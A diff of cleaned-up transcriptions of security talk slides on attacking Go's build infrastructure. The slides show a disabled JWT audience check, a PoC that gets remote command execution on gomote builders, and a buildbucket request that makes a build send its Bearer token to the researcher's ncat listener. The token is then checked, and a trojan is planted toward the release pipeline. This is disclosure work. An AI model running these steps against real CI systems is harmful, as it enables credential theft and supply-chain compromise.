@@ -14,9 +14,9 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 86.8
 ocr_unreliable_blocks: 2
-vision_unreviewed_pages: 72
-vision_verified_pages_changed: 76
-vision_verified_pages: 102
+vision_unreviewed_pages: 0
+vision_verified_pages_changed: 141
+vision_verified_pages: 174
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 3
 companion_files: []
@@ -1865,23 +1865,33 @@ Golang 3
 
 ## Slide 103
 
-
-> Recovered by OCR — confidence 74/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-CG 25 https://build.golang.org
-Name [master v] CO show only first-class ports
-drchase-gotip-linux-arr
-drchase-gotip-linux-arr
+https://gomote.golang.org
+
+Gomote Server
+
+Instances
+
+Name
+drchase-gotip-linux-am
+drchase-gotip-linux-am
+
+https://build.golang.org
+
+Go Build Coordinator     Build Dashboard   Performance Dashboard   Builders
+
+master   show only first-class ports
+
 Go
-darwin
-amd64 amd64 amd64 amd64 amd64 arm64 arm64 arm64 arm64 arm64 386
-6db72bb jorro... 25 Jul 13:25 cmd/compile: remove... ok ok ok ok fail ok ok ok ok ok ok
-af4b@2c jorro... 25 Jul 13:24 cmd/compile: donot... ok ok ok ok fail ok ok ok ok ok ok
-Zb4aab8 sam... 25 Jul 03:27 internal/strconv: rem... ok ok ok ok fail ok ok ok ok ok ok
-a961f70 hya... 24 Jul 21:36 cmd/go/internal/doc:.... ok ok ok ok fail ok ok ok ok ok __ ok
-a3b0982 ado... 24 Jul 21:26 cmd/vet: update Test... ok ok ok ok fail ok ok ok ok ok _— ok
-fOdbb9b 24 Jul 18:48 cmd: update x/toolst... ok ok ok — ok ok ok ok ok _— ok ok
+                                             darwin
+        amd64   amd64   amd64   amd64   amd64   arm64   arm64   arm64   arm64   arm64 | 386
+         13-     14-     15-   longtest  nocgo-    13-     14-     15-     26-  longtest | clang15
+6db72bb  jorro...  25 Jul 13:25  cmd/compile: remove...        ok ok ok ok fail ok ok ok ok ok | ok
+af4b02c  jorro...  25 Jul 13:24  cmd/compile: do not ...       ok ok ok ok fail ok ok ok ok ok | ok
+7b4aab8  sam...    25 Jul 03:27  internal/strconv: rem...      ok ok ok ok fail ok ok ok ok ok | ok
+a961f70  hya...    24 Jul 21:36  cmd/go/internal/doc: ...      ok ok ok ok fail ok ok ok ok ok | ok
+a3b0982  ado...    24 Jul 21:26  cmd/vet: update Test...       ok ok ok ok fail ok ok ok ok ok | ok
+f0dbb9b  ado...    24 Jul 18:48  cmd: update x/tools t...      ok ok ok ok ok  ok ok ok ok ok | ok
 ```
 
 ## Slide 104
@@ -1894,53 +1904,48 @@ Redirect to Login ... Not in IAM list → 403
 
 ## Slide 105
 
-|<header>.**{**|
-|---|
-|"iss":
-"https://cloud.google.com/iap",|
-|"aud":
-"/projects/<proj-id>/global/backendServices/<svc-id>",|
-|"sub":
-"accounts.google.com:<account-id>",|
-|Redirect to Login ...
- "email":
-"someone@google.com",|
-|"hd":
-"google.com",|
-|**IAP**
-Not in IAM list → 403
- "iat":
-1145141919,|
-|Identity-Aware Proxy
- "exp":
-1145149453,|
-|Pass
-**gomote.golang.org**
- "google":
-{"access_levels": [...] }|
-|**build.golang.org**
-**}**.<signature>|
-|InjectX-Goog-IAP-JWT-Assertion
-header|
+```text
+<header>.{
+  "iss":      "https://cloud.google.com/iap",
+  "aud":      "/projects/<proj-id>/global/backendServices/<svc-id>",
+  "sub":      "accounts.google.com:<account-id>",
+  "email":    "someone@google.com",
+  "hd":       "google.com",
+  "iat":      1145141919,
+  "exp":      1145149453,
+  "google":   { "access_levels": [...] }
+}.<signature>
+```
 
 ## Slide 106
 
-###### "" = IAPSkipAudienceValidation
+```go
+IAPSkipAudienceValidation = ""
 
-RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation) * * func (v Validator) validate(ctx, idToken, audience) ( Payload, err) { if audience != "" && payload.Audience != audience { return nil, fmt.Errorf( " idtoken: audience does not match " )
+RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)
+
+func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
+    if audience != "" && payload.Audience != audience {
+        return nil, fmt.Errorf("idtoken: audience does not match")
+```
 
 ## Slide 107
 
-###### "" = IAPSkipAudienceValidation
+```go
+IAPSkipAudienceValidation = ""
 
-RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation) * * func (v Validator) validate(ctx, idToken, audience) ( Payload, err) { if audience != "" && payload.Audience != audience {
+RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)
+```
 
-return nil, fmt.Errorf( " idtoken: audience does not match " )
+**Always Pass!**
+
+```go
+func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
+    if audience != "" && payload.Audience != audience {
+        return nil, fmt.Errorf("idtoken: audience does not match")
+```
 
 ## Slide 108
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 go / build / 8cc3517581090ba52a473fc0602e02169929d921
@@ -1961,129 +1966,117 @@ Updates golang/go#48742
 
 ## Slide 109
 
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 go / build / 8cc3517581090ba52a473fc0602e02169929d921
-commit
-author
-committer
-tree
-parent
-8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
-Carlos Amedee <carlos@golang.org> Fri Jan 14 10
-Carlos Amedee <carlos@golang.org> Sat Jan 15 00
-09d18253d412a5a6c4177d5056a968953fe6269e [diff]
+commit 8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
+author Carlos Amedee <carlos@golang.org> Fri Jan 14 10
+committer Carlos Amedee <carlos@golang.org> Sat Jan 15 00
+tree 84a37675b293c344e243c08300cc322682f8792d
+parent 09d18253d412a5a6c4177d5056a968953fe6269e [diff]
 internal/access, cmd/coordinator: add option to disable audience check
 This change adds the option to skip the validation of the audience
-field in JWT tokens. |We understand that validating the JWT token is
+field in JWT tokens. We understand that validating the JWT token is
 enough to know that the packet came from a valid source.
 Updates golang/go#48742
 ```
 
 ## Slide 110
 
-
-> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-346
-347
-348
-349
-350
-351
-352
-353
-346
-347
-348
-349
-350
-351
-352
-353
-@@ -346,8 +346,
-if serviceID = env. IAPServiceID(coordinatorBackend); serviceID == "" {
-log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
-}
-opts =
-8 @@ func main() {
-append(opts,
-+2 -2 8820
-opts =
-opts =
-grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation) ) )
-opts =
-}
-append(opts,
-append(opts,
-append(opts,
-// grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored
-otherwise.
-grpcServer
-:= grpc.NewServer(opts...)
+cmd/coordinator/coordinator.go                                    +2 -2
+
+@@ -346,8 +346,8 @@ func main() {
+346  346          if serviceID = env.IAPServiceID(coordinatorBackend); serviceID == "" {
+347  347              log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
+348  348          }
+349      -       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
+350      -       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
+     349  +       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)))
+     350  +       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPSkipAudienceValidation)))
+351  351      }
+352  352      // grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored otherwise.
+353  353      grpcServer := grpc.NewServer(opts...)
 ```
 
 ## Slide 111
 
+```text
 - RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))
 + RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)
+```
+
+```text
+cmd/coordinator/coordinator.go                                    +2 -2
+
+@@ -346,8 +346,8 @@ func main() {
+346  346          if serviceID = env.IAPServiceID(coordinatorBackend); serviceID == "" {
+347  347              log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
+348  348          }
+349      -       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
+350      -       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
+     349  +       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)))
+     350  +       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPSkipAudienceValidation)))
+351  351      }
+352  352      // grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored otherwise.
+353  353      grpcServer := grpc.NewServer(opts...)
+```
 
 ## Slide 112
 
-
-> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Go Build Coordinator Performance Das
+Go Build Coordinator     Build Dashboard   Performance Das
+
 Defined Builders
-name owners
-aix-ppc64 pc64-osuos! @trex58
-android-386-emu host-linux-amd64-androidemu golang-dev
-android-amd64-emu inux-amd64-androidemu golang-dev
-android-arm-corellium host-android-arm64-corellium-android @steeve, @changkun
-android-arm64-corellium host-android-arm64-corellium-android @steeve, @changkun
-darwin-amd64-10_15 ho: amd6 golang-dev
-darwin-amd64-11_0 host-darwin-amd64-11-aws golang-dev
-darwin-amd64-12_0 host-darwin-amd64-12-aws golang-dev
-darwin-amd64-13 host-dai amd64-13-aws golang-dev
-darwin-amd64-longtest host-darwin-amd64-13-aws golang-dev
-darwin-amd64-nocgo host-darwin-amd64-12-aws golang-dev
-darwin-amd64-race ho: amd64-12-aws golang-dev
-darwin-arm64-11 host-darwin-arm64-11 golang-dev
-darwin-arm64-12 host-darwin-arm64-12 golang-dev
-dragonfly-amd64-622 host-dragonfl golang-dev
-freebsd-386-12_3 host-freebsd-amd64-12_ 3 golang-dev
-freebsd-386-13_0 host-freebsd-amd64-13_0 golang-dev
-freebsd-amd64-12_3 ‘eebsd-amdé: golang-dev
-freebsd-amd64-13_0 freebsd-amd64-13 0 golang-dev
-freebsd-amd64-race host-freebsd-amd64-13_0 golang-dev
-freebsd-arm-paulzhol @paulzhol
-freebsd-arm64-dmgk @dmi
-freebsd-riscv64-unmatched @mengzhuo
-illumos-amd64
+
+name                        pool                                    owners
+aix-ppc64                   host-aix-ppc64-osuosl                   @trex58
+android-386-emu              host-linux-amd64-androidemu             golang-dev
+android-amd64-emu            host-linux-amd64-androidemu             golang-dev
+android-arm-corellium         host-android-arm64-corellium-android    @steeve, @changkun
+android-arm64-corellium       host-android-arm64-corellium-android    @steeve, @changkun
+darwin-amd64-10_15            host-darwin-amd64-10_15-aws             golang-dev
+darwin-amd64-11_0             host-darwin-amd64-11-aws                golang-dev
+darwin-amd64-12_0             host-darwin-amd64-12-aws                golang-dev
+darwin-amd64-13               host-darwin-amd64-13-aws                golang-dev
+darwin-amd64-longtest         host-darwin-amd64-13-aws                golang-dev
+darwin-amd64-nocgo            host-darwin-amd64-12-aws                golang-dev
+darwin-amd64-race             host-darwin-amd64-12-aws                golang-dev
+darwin-arm64-11               host-darwin-arm64-11                    golang-dev
+darwin-arm64-12               host-darwin-arm64-12                    golang-dev
+dragonfly-amd64-622           host-dragonfly-amd64-622                golang-dev
+freebsd-386-12_3              host-freebsd-amd64-12_3                 golang-dev
+freebsd-386-13_0              host-freebsd-amd64-13_0                 golang-dev
+freebsd-amd64-12_3            host-freebsd-amd64-12_3                 golang-dev
+freebsd-amd64-13_0            host-freebsd-amd64-13_0                 golang-dev
+freebsd-amd64-race            host-freebsd-amd64-13_0                 golang-dev
+freebsd-arm-paulzhol          host-freebsd-arm-paulzhol               @paulzhol
+freebsd-arm64-dmgk            host-freebsd-arm64-dmgk                 @dmgk
+freebsd-riscv64-unmatched     host-freebsd-riscv64-unmatched          @mengzhuo
+illumos-amd64                 host-illumos-amd64-jclulow               @jclulow
 ```
 
 ## Slide 113
 
-
-> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
 ```text
-eee & splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc
-+ poc IAP_JWT=$(/Users/splitline/golang-cicd-sec/make_iap_jwt.sh \
---cid 'a8ebf94c8-O1ff-457a-aed4-4add00d5f328' \
---app-url ‘https://serene-smoke-244105.uc.r.appspot.com/' \
---sa ‘iap-tester@serene-smoke-244105.1am.gserviceaccount.com' \
---project 'serene-smoke-244105' \
+splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc
+
+poc IAP_JWT=$(/Users/splitline/golang-cicd-sec/make_iap_jwt.sh \
+  --cid 'a8ebf94c8-01ff-457a-aed4-4add00d5f328' \
+  --app-url 'https://serene-smoke-244105.uc.r.appspot.com/' \
+  --sa 'iap-tester@serene-smoke-244105.iam.gserviceaccount.com' \
+  --project 'serene-smoke-244105' \
+  2>/dev/null)
+
 echo "${IAP_JWT:0:120}..."
-)+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" create gol.25-Linux-amd64
-[*] Waiting (@ ahead)...
-[+] Created iap-tester-gol.25-Linux-amd64-@ (Cbuilder=go1.25-linux-amd64, host=swarming task)
-)+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" -sys exec iap-tester-gol.25-Linux-amd64-@ -- bash -c "id; uname -a"
-Linux golang-ciw-n1-1linux-x86-bullseye-us-centrall-b-Q-vvxv 6.1.161+ #1 SMP PREEMPT_DYNAMIC Sat Feb 7 20:26:32 UTC 2026 x86_64 GNU/Li
+
+eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InVvWZyJ9.eyJhdWQiOiIvcHJvamVjdHMvMzE4OTA0NjM1L2FwcHMvc2VydW5lLXNtb2t2t...
+
+poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" create go1.25-linux-amd64
+[*] Waiting (0 ahead)...
+[+] Created iap-tester-go1.25-linux-amd64-0  (builder=go1.25-linux-amd64, host=swarming task)
+poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" -sys exec iap-tester-go1.25-linux-amd64-0 -- bash -c "id; uname -a"
+uid=1000(swarming) gid=1000(swarming) groups=1000(swarming)
+Linux golang-ciw-n1-linux-x86-bullseye-us-central1-b-0-vvxv 6.1.161+ #1 SMP PREEMPT_DYNAMIC Sat Feb  7 20:26:32 UTC 2026 x86_64 GNU/Li
 ```
 
 ## Slide 114
@@ -2097,11 +2090,11 @@ Job#1
 Prod Task
 LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 Bot
-Job�Worker
+Job Worker
 Try Task
 
 ## Slide 115
@@ -2110,17 +2103,17 @@ Job#1
 Job#2
 Local Auth RPC
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 116
@@ -2130,18 +2123,18 @@ Job#2
 Local Auth RPC
 security-try-workers
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 ci-workers
 … try-workers
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 117
@@ -2151,18 +2144,18 @@ Job#2
 Local Auth RPC
 security-try-workers
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 ci-workers
 … try-workers
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 118
@@ -2172,18 +2165,18 @@ Job#2
 Local Auth RPC
 security-try-workers
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 ci-workers
 … try-workers
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 Cross Bot?
 
@@ -2193,36 +2186,51 @@ Job#1
 Job#2
 Local Auth RPC
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 ServiceAccount: "coordinator-builder@golang-ci-luci…"
 …
 CipdPackage:    "infra/tools/luci-auth/…"
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 120
 
-###### Job#1
-
-Job#2 Local Auth RPC Job#3 Security�Bot luci.binding(… Releasing�/�Security�Patch Auth Service Account ~~roles~~ = ~~"role/buildbu~~ cket.triggerer", Job#1 users = [" coordinator-builder@ …", "security-coordinator-builder@…"], Security Task ) LUCI_CONTEXT
-
-LUCI_CONTEXT
-
+Job#1
 Job#2
+Job#3
+…
+Se
 
+Local Auth RPC
+Auth
+Service Account
+LUCI_CONTEXT
 Based on Task Type
 
+luci.binding(
+    roles = "role/buildbucket.triggerer",
+    users = ["coordinator-builder@…", "security-coordinator-builder@…"],
+)
+
+Trigger Arbitrary Job!
+
+Job#2
 Job#3
 
-ServiceAccount: " coordinator-builder@ golang-ci-luci…" … CipdPackage:    "infra/tools/luci-auth/…" Public Task Try�Bot chromium-swarm.appspot.com
+ServiceAccount: "coordinator-builder@golang-ci-luci…"
+CipdPackage:    "infra/tools/luci-auth/…"
+
+Public Task
+Try Bot
+chromium-swarm.appspot.com
 
 ## Slide 121
 
@@ -2236,7 +2244,7 @@ curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H 
 
 curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \
 
---json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" },
+--json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" },
 
 "gerritChanges": [{
 
@@ -2248,13 +2256,53 @@ curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H 
 
 ## Slide 123
 
-curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'
+curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'
+
+```text
+ncat -klvp 1337
+
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 34.82.20.82:55177.
+GET /a/changes/go~99999 HTTP/1.1
+Host: splitline.tw
+Accept-Encoding: gzip
+Authorization: Bearer ya29.c.c0AZ4bNpZMFNTfxF0kIADxm9
+User-Agent: Go-http-client/2.0
+```
 
 ## Slide 124
 
-curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "bucket": "builder": { "project": "golang", "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{
+curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'
 
-"host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'
+```text
+ncat -klvp 1337
+
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 34.82.20.82:55177.
+GET /a/changes/go~99999 HTTP/1.1
+Host: splitline.tw
+Accept-Encoding: gzip
+Authorization: Bearer ya29.c.c0AZ4bNpZMFNTfxF0kIADxm9
+User-Agent: Go-http-client/2.0
+```
+
+```text
+~ curl -s "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$STOLEN_TOKEN" 2>&1
+{
+  "azp": "116567426346993112035",
+  "aud": "116567426346993112035",
+  "scope": "https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gerritps://www.googleapis.com/auth/cloud-platform",
+  "exp": "1771430176",
+  "expires_in": "3398",
+  "email": "security-coordinator-builder@golang-ci-luci.iam.gserviceaccount.com",
+  "email_verified": "true",
+  "access_type": "online"
+}
+```
 
 ## Slide 125
 
@@ -2263,17 +2311,17 @@ Job#2
 Local Auth RPC
 security-worker-builder@
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 126
@@ -2284,17 +2332,17 @@ Job#2
 Local Auth RPC
 security-worker-builder@
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 127
@@ -2305,17 +2353,17 @@ Job#2
 Local Auth RPC
 security-worker-builder@
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 Public Task
-Try�Bot
+Try Bot
 chromium-swarm.appspot.com
 
 ## Slide 128
@@ -2326,18 +2374,18 @@ Job#2
 Local Auth RPC
 security-worker-builder@
 Job#3
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Service Account
 Job#1
 Security Task
 Security Patch LUCI_CONTEXT
 Job#2
-Based on  Task Type
+Based on Task Type
 Job#3
 …
 RELUI
 Public Task
-Try�Bot REL ease� UI
+Try Bot REL ease UI
 chromium-swarm.appspot.com
 
 ## Slide 129
@@ -2349,7 +2397,7 @@ Local Auth RPC
 security-worker-builder@
 Job#3
 Release
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Pipeline Service Account
 Job#1
 Security Task
@@ -2360,7 +2408,7 @@ Job#3
 …
 RELUI
 Public Task
-Try�Bot REL ease� UI
+Try Bot REL ease UI
 chromium-swarm.appspot.com
 
 ## Slide 130
@@ -2372,7 +2420,7 @@ Local Auth RPC
 security-worker-builder@
 Job#3
 Release
-Security�Bot
+Security Bot
 … chrome-swarming.appspot.com Auth Pipeline Service Account
 Job#1
 Security Task
@@ -2383,43 +2431,40 @@ Job#3
 …
 RELUI
 Public Task
-Try�Bot REL ease� UI
+Try Bot REL ease UI
 chromium-swarm.appspot.com
 
 ## Slide 131
 
-
-> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 x/build/internal/gomote: explore destroying the bot after a gomote
 instance is destroyed #63819
-© Open Listed in Q)#61772
-i) cagedmantis opened on Oct 30, 2023
-Last edited by cagedmantis ~ Contributor
+Open   Listed in #61772
+cagedmantis opened on Oct 30, 2023          Last edited by cagedmantis   Contributor
 When a gomote instance runs on a swarming task instead of a bare VM/Container, we should consider destroying the bot after the
 gomote instance has completed running. This should be an added safeguard for unwanted artifacts being left behind on the instance.
 @golang/release
-©
 ```
+
+**Bot Reusing!**
 
 ## Slide 132
 
 Job#1 Job#2 Job#3 …
 
-RELUI REL ease� UI
+RELUI REL ease UI
 
-Security Task Security Patch Security�Bot chrome-swarming.appspot.com
+Security Task Security Patch Security Bot chrome-swarming.appspot.com
 
 ## Slide 133
 
-**Our#1** Job#2 RELUI Job#3 REL ease� UI … security-worker-builder@ Security Task Security Patch Security�Bot chrome-swarming.appspot.com
+**Our#1** Job#2 RELUI Job#3 REL ease UI … security-worker-builder@ Security Task Security Patch Security Bot chrome-swarming.appspot.com
 
 ## Slide 134
 
 Plant Trojan!
 RELUI
-REL ease� UI
+REL ease UI
 
 Our#1
 Job#2
@@ -2427,67 +2472,67 @@ Job#3
 …
 security-worker-builder@
 Security Task
-Security Patch Security�Bot
+Security Patch Security Bot
 chrome-swarming.appspot.com
 
 ## Slide 135
 
-(do evil things) Job#1 **Job#2** RELUI Job#3 REL ease� UI … security-worker-builder@ Security Task Security Patch Security�Bot chrome-swarming.appspot.com
+(do evil things) Job#1 **Job#2** RELUI Job#3 REL ease UI … security-worker-builder@ Security Task Security Patch Security Bot chrome-swarming.appspot.com
 
 ## Slide 136
 
 Got You RELUI!
 
-Job#1 **Job#2** Job#3 … relui-task@ **relui-task@** Security Task Security Patch Security�Bot chrome-swarming.appspot.com
-
-relui-task@
+Job#1 **Job#2** Job#3 … relui-task@ **relui-task@** Security Task Security Patch Security Bot chrome-swarming.appspot.com
 
 RELUI
-REL ease� UI
+REL ease UI
 
 ## Slide 137
 
-Got You RELUI! **relui-task@** Job#1 **Job#2** RELUI Job#3 REL ease� UI … **relui-task@** relui-task@ Security Task Security Patch Security�Bot W ho Are You chrome-swarming.appspot.com ?
+Got You RELUI! **relui-task@** Job#1 **Job#2** RELUI Job#3 REL ease UI … **relui-task@** Security Task Security Patch Security Bot chrome-swarming.appspot.com
+
+Who Are You?
 
 ## Slide 138
 
 ### Releasing Pipeline
 
-dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot**
+dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot**
 
 ## Slide 139
 
 ### Releasing Pipeline
 
-dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@
+dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@
 
 ## Slide 140
 
 ### Releasing Pipeline
 
-dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
+dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
 
 ## Slide 141
 
 ### Releasing Pipeline
 
-dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
+dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
 
 ## Slide 142
 
 ### Releasing Pipeline
 
-dl.google.com/go Pipeline gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
+dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]
 
 ## Slide 143
 
 ### Releasing Pipeline
 
-dl.google.com/go gs://golang/ **Compare Sign Upload**
-
-**Cloud Build Gerrit Compare Source Code Windows bot** relui-task@
+dl.google.com/go gs://golang/ **Gerrit Cloud Build**
 
 [ gs://golang-release-staging ]
+
+**Compromised!**
 
 ## Slide 144
 
@@ -2495,43 +2540,49 @@ Python 4
 
 ## Slide 145
 
+how to install python
+
 ## Slide 146
-
-
-> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 how to install python
-AlMode All Videos Shortvideos Images Forums News’ More ~ Tools »
-> Al Overview
+
+AI Mode   All   Videos   Short videos   Images   Forums   News   More   Tools
+
+AI Overview
+
 To install Python, go to the Official Python Downloads Page for your OS, download the
 latest stable version, and run the installer. Crucial: Ensure you check the box that says
 "Add python.exe to PATH" (or "Add Python to environment variables") before clicking "Install
-Now." 2
+Now."
 ```
 
 ## Slide 147
 
-
-> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 how to install python
-AlMode All Videos Shortvideos Images Forums News’ More ~ Tools »
-> Al Overview
+
+AI Mode   All   Videos   Short videos   Images   Forums   News   More   Tools
+
+AI Overview
+
